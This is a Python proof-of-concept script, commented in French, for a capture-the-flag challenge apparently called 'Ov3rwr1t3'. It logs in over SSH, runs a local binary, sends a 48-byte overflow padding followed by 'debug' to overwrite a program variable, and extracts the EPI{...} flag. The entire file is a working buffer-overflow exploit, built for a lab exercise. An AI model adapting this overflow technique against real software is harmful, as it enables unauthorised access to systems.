#!/usr/bin/env python3
# POC - ECORP Challenge Ov3rwr1t3 (database-reader)

import paramiko
import getpass
import re
import sys
import time

BINARY = "/opt/intern/database-reader"  # adapte le chemin si besoin
PAYLOAD = "A" * 48 + "debug"

# Connexion SSH

def connect_ssh():
    print("\n[*] Connexion SSH...")
    ssh_host = input("    Host (ex: ecorp.cyber.epitest.eu) : ").strip()
    ssh_port = int(input("    Port                             : ").strip())
    ssh_user = input("    Utilisateur                      : ").strip()
    ssh_pass = getpass.getpass("    Mot de passe                     : ")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ssh_host, port=ssh_port, username=ssh_user, password=ssh_pass)
        print(f"[+] Connecté en SSH sur {ssh_host}:{ssh_port} !")
        return client
    except Exception as e:
        print(f"[!] Erreur SSH : {e}")
        sys.exit(1)

# Exploitation

def exploit(client, path):
    print(f"\n[*] Lancement du binaire {path}...")
    channel = client.get_transport().open_session()
    channel.set_combine_stderr(True)
    channel.get_pty()
    channel.exec_command(path)

    output = ""
    prompt_detected = False
    # Attente du prompt
    for _ in range(50):
        time.sleep(0.1)
        if channel.recv_ready():
            chunk = channel.recv(4096).decode(errors="replace")
            output += chunk
            print(f"[~] Reçu : {chunk.strip()}")
            if "password" in chunk.lower() or ":" in chunk:
                prompt_detected = True
                break
    print(f"[+] Prompt détecté, envoi du payload...")
    channel.sendall((PAYLOAD + "\n").encode())
    # Lecture de la réponse
    time.sleep(1)
    while channel.recv_ready():
        chunk = channel.recv(4096).decode(errors="replace")
        output += chunk
    channel.close()
    print(f"\n[+] Output complet :\n{output}")
    return output

def extract_flag(output):
    match = re.search(r'EPI\{[^}]+\}', output)
    if match:
        return match.group(0)
    return None

def main():
    print("================================================")
    print("  POC - ECORP Challenge : Ov3rwr1t3 (database-reader)")
    print("================================================")
    client = connect_ssh()
    binary_path = BINARY  # adapte si besoin
    output = exploit(client, binary_path)
    flag = extract_flag(output)
    client.close()
    if flag:
        print(f"\n{'=' * 48}")
        print(f"   FLAG : {flag}")
        print(f"{'=' * 48}")
    else:
        print("[!] Flag non trouvé dans la sortie.")
        print("[~] Output brut :")
        print(repr(output))

if __name__ == "__main__":
    main()
